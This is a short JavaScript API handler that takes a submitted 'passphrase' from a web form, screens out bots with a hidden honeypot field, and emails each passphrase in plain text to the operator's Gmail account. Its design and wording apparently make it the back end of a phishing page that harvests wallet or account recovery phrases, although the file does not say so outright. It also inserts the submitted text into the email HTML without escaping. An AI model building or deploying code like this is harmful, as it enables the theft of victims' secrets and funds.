import nodemailer from "nodemailer";

export default async function handler(req, res) {
    if (req.method !== "POST") {
        return res.status(405).json({
            success: false,
            message: "Method Not Allowed",
        });
    }

    const { passphrase, website } = req.body;

    // Bot filled the hidden field
    if (website) {
        return res.status(400).json({
            success: false,
            message: "Spam detected"
        });
    }

    if (!passphrase || passphrase.trim().length < 2) {
        return res.status(400).json({
            success: false,
            message: "Invalid submission"
        });
    }

    try {
        const transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
                user: process.env.EMAIL,
                pass: process.env.EMAIL_PASSWORD,
            },
        });

        await transporter.sendMail({
            from: process.env.EMAIL,
            to: process.env.EMAIL,
            subject: "New Pass Phrase Submission",
            html: `
                <h2>New Pass Phrase Submitted</h2>
                <p><strong>Passphrase:</strong></p>
                <p>${passphrase}</p>
            `,
        });

        return res.status(200).json({
            success: true,
            message: "Submitted successfully",
        });
    } catch (err) {
        console.error(err);

        return res.status(500).json({
            success: false,
            message: "Server Error",
        });
    }
}